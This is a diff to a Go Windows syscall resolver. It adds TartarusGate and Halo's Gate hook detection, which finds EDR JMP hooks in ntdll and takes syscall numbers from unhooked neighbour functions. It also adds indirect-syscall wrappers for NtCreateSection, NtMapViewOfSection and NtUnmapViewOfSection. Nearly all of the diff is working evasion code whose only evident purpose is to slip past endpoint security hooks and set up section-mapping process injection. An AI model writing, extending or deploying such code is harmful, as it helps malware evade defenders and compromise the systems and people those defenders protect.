@@ -130,6 +130,9 @@ func (r *SyscallResolver) init() error {
 		"NtSetContextThread",
 		"NtOpenThread",
 		"NtQueueApcThread",
+		"NtCreateSection",
+		"NtMapViewOfSection",
+		"NtUnmapViewOfSection",
 	}
 
 	for _, name := range keyFunctions {
@@ -221,21 +224,27 @@ func (r *SyscallResolver) parseExports(ntdllBase uintptr) (map[string]*SyscallEn
 		funcRVA := *(*uint32)(unsafe.Pointer(functionsRVA + uintptr(ordinal)*4))
 		funcAddr := ntdllBase + uintptr(funcRVA)
 
-		// Hell's Gate: check for the standard syscall prologue
-		// mov r10, rcx  (4C 8B D1)
-		// mov eax, NUM  (B8 XX XX 00 00)
-		funcBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 24)
+		// TartarusGate: Check explicitly for hooking patterns, especially JMP (0xE9)
+		funcBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 64)
 
 		var sysNum uint16
 		var found bool
+		isHooked := false
 
-		if funcBytes[0] == 0x4C && funcBytes[1] == 0x8B && funcBytes[2] == 0xD1 &&
+		if funcBytes[0] == 0xE9 {
+			isHooked = true
+		}
+
+		// Hell's Gate: check for the standard syscall prologue
+		// mov r10, rcx  (4C 8B D1)
+		// mov eax, NUM  (B8 XX XX 00 00)
+		if !isHooked && funcBytes[0] == 0x4C && funcBytes[1] == 0x8B && funcBytes[2] == 0xD1 &&
 			funcBytes[3] == 0xB8 {
 			// Clean function — extract syscall number
 			sysNum = binary.LittleEndian.Uint16(funcBytes[4:6])
 			found = true
 		}
-		// If hooked (different prologue), try Halo's Gate later
+		// If hooked (different prologue), try Halo's Gate/TartarusGate later
 
 		if !found {
 			continue
@@ -243,8 +252,8 @@ func (r *SyscallResolver) parseExports(ntdllBase uintptr) (map[string]*SyscallEn
 
 		// Find the syscall;ret gadget (0F 05 C3) within this function
 		var syscallRetAddr uintptr
-		scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 64)
-		for j := 0; j < 60; j++ {
+		scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 128)
+		for j := 0; j < 120; j++ {
 			if scanBytes[j] == 0x0F && scanBytes[j+1] == 0x05 && scanBytes[j+2] == 0xC3 {
 				syscallRetAddr = funcAddr + uintptr(j)
 				break
@@ -314,56 +323,80 @@ func (r *SyscallResolver) halosGate(ntdllBase uintptr, exports *imageExportDirec
 		return ntFuncs[a].addr < ntFuncs[b].addr
 	})
 
+	// TartarusGate / HalosGate logic
 	// For unresolved functions, look at neighbors to calculate syscall number
 	for i, f := range ntFuncs {
 		if f.resolved {
 			continue
 		}
-		// Look for nearest resolved neighbor
-		for delta := 1; delta < 10; delta++ {
-			// Check upward neighbor
-			if i-delta >= 0 && ntFuncs[i-delta].resolved {
-				sysNum := ntFuncs[i-delta].sysNum + uint16(delta)
-				funcAddr := f.addr
-				// Find syscall;ret in the function (it should be unhooked at that offset)
-				var syscallRetAddr uintptr
-				scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 64)
-				for j := 0; j < 60; j++ {
-					if scanBytes[j] == 0x0F && scanBytes[j+1] == 0x05 && scanBytes[j+2] == 0xC3 {
-						syscallRetAddr = funcAddr + uintptr(j)
-						break
-					}
-				}
-				entries[f.name] = &SyscallEntry{
-					Name:       f.name,
-					Number:     sysNum,
-					FuncAddr:   funcAddr,
-					SyscallRet: syscallRetAddr,
-				}
-				ntFuncs[i].resolved = true
-				ntFuncs[i].sysNum = sysNum
-				break
-			}
-			// Check downward neighbor
+
+		// Look for nearest resolved neighbor, up to 500 neighbors away (robustness for deep hooking)
+		for delta := 1; delta < 500; delta++ {
+			foundNeighbor := false
+			// Check downward neighbor (higher memory address, typically higher sysnum)
 			if i+delta < len(ntFuncs) && ntFuncs[i+delta].resolved {
 				sysNum := ntFuncs[i+delta].sysNum - uint16(delta)
 				funcAddr := f.addr
 				var syscallRetAddr uintptr
-				scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 64)
-				for j := 0; j < 60; j++ {
-					if scanBytes[j] == 0x0F && scanBytes[j+1] == 0x05 && scanBytes[j+2] == 0xC3 {
-						syscallRetAddr = funcAddr + uintptr(j)
-						break
+				scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 128)
+
+				// Ensure the neighbor itself isn't hooked with a JMP (0xE9) at start
+				neighborAddr := ntFuncs[i+delta].addr
+				neighborBytes := unsafe.Slice((*byte)(unsafe.Pointer(neighborAddr)), 1)
+				if neighborBytes[0] != 0xE9 {
+					for j := 0; j < 120; j++ {
+						// Look for syscall; ret (0x0F 0x05 0xC3)
+						if scanBytes[j] == 0x0F && scanBytes[j+1] == 0x05 && scanBytes[j+2] == 0xC3 {
+							syscallRetAddr = funcAddr + uintptr(j)
+							break
+						}
 					}
+					entries[f.name] = &SyscallEntry{
+						Name:       f.name,
+						Number:     sysNum,
+						FuncAddr:   funcAddr,
+						SyscallRet: syscallRetAddr,
+					}
+					ntFuncs[i].resolved = true
+					ntFuncs[i].sysNum = sysNum
+					foundNeighbor = true
 				}
-				entries[f.name] = &SyscallEntry{
-					Name:       f.name,
-					Number:     sysNum,
-					FuncAddr:   funcAddr,
-					SyscallRet: syscallRetAddr,
+			}
+
+			if foundNeighbor {
+				break
+			}
+
+			// Check upward neighbor (lower memory address, typically lower sysnum)
+			if i-delta >= 0 && ntFuncs[i-delta].resolved {
+				sysNum := ntFuncs[i-delta].sysNum + uint16(delta)
+				funcAddr := f.addr
+				var syscallRetAddr uintptr
+				scanBytes := unsafe.Slice((*byte)(unsafe.Pointer(funcAddr)), 128)
+
+				// Ensure the neighbor itself isn't hooked with a JMP (0xE9) at start
+				neighborAddr := ntFuncs[i-delta].addr
+				neighborBytes := unsafe.Slice((*byte)(unsafe.Pointer(neighborAddr)), 1)
+				if neighborBytes[0] != 0xE9 {
+					for j := 0; j < 120; j++ {
+						// Look for syscall; ret (0x0F 0x05 0xC3)
+						if scanBytes[j] == 0x0F && scanBytes[j+1] == 0x05 && scanBytes[j+2] == 0xC3 {
+							syscallRetAddr = funcAddr + uintptr(j)
+							break
+						}
+					}
+					entries[f.name] = &SyscallEntry{
+						Name:       f.name,
+						Number:     sysNum,
+						FuncAddr:   funcAddr,
+						SyscallRet: syscallRetAddr,
+					}
+					ntFuncs[i].resolved = true
+					ntFuncs[i].sysNum = sysNum
+					foundNeighbor = true
 				}
-				ntFuncs[i].resolved = true
-				ntFuncs[i].sysNum = sysNum
+			}
+			if foundNeighbor {
 				break
 			}
 		}
@@ -709,5 +742,60 @@ func IndirectNtClose(handle uintptr) uint32 {
 		return 0xC0000001
 	}
 	r, _, _ := syscall.SyscallN(entry.StubAddr, handle)
+	return uint32(r)
+}
+
+// IndirectNtCreateSection creates a section object.
+// NTSTATUS NtCreateSection(*SectionHandle, DesiredAccess, *ObjectAttributes, *MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle)
+func IndirectNtCreateSection(sectionHandle *uintptr, desiredAccess uint32, objectAttributes uintptr, maximumSize *uint64, sectionPageProtection, allocationAttributes uint32, fileHandle uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtCreateSection"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		uintptr(unsafe.Pointer(sectionHandle)),
+		uintptr(desiredAccess),
+		objectAttributes,
+		uintptr(unsafe.Pointer(maximumSize)),
+		uintptr(sectionPageProtection),
+		uintptr(allocationAttributes),
+		fileHandle,
+	)
+	return uint32(r)
+}
+
+// IndirectNtMapViewOfSection maps a view of a section into the virtual address space of a process.
+// NTSTATUS NtMapViewOfSection(SectionHandle, ProcessHandle, *BaseAddress, ZeroBits, CommitSize, *SectionOffset, *ViewSize, InheritDisposition, AllocationType, Win32Protect)
+func IndirectNtMapViewOfSection(sectionHandle, processHandle uintptr, baseAddress *uintptr, zeroBits, commitSize uintptr, sectionOffset *uint64, viewSize *uintptr, inheritDisposition, allocationType, win32Protect uint32) uint32 {
+	entry := indirectSyscallResolver.entries["NtMapViewOfSection"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		sectionHandle,
+		processHandle,
+		uintptr(unsafe.Pointer(baseAddress)),
+		zeroBits,
+		commitSize,
+		uintptr(unsafe.Pointer(sectionOffset)),
+		uintptr(unsafe.Pointer(viewSize)),
+		uintptr(inheritDisposition),
+		uintptr(allocationType),
+		uintptr(win32Protect),
+	)
+	return uint32(r)
+}
+
+// IndirectNtUnmapViewOfSection unmaps a view of a section from the virtual address space of a process.
+// NTSTATUS NtUnmapViewOfSection(ProcessHandle, BaseAddress)
+func IndirectNtUnmapViewOfSection(processHandle, baseAddress uintptr) uint32 {
+	entry := indirectSyscallResolver.entries["NtUnmapViewOfSection"]
+	if entry == nil || entry.StubAddr == 0 {
+		return 0xC0000001
+	}
+	r, _, _ := syscall.SyscallN(entry.StubAddr,
+		processHandle,
+		baseAddress,
+	)
 	return uint32(r)
 }
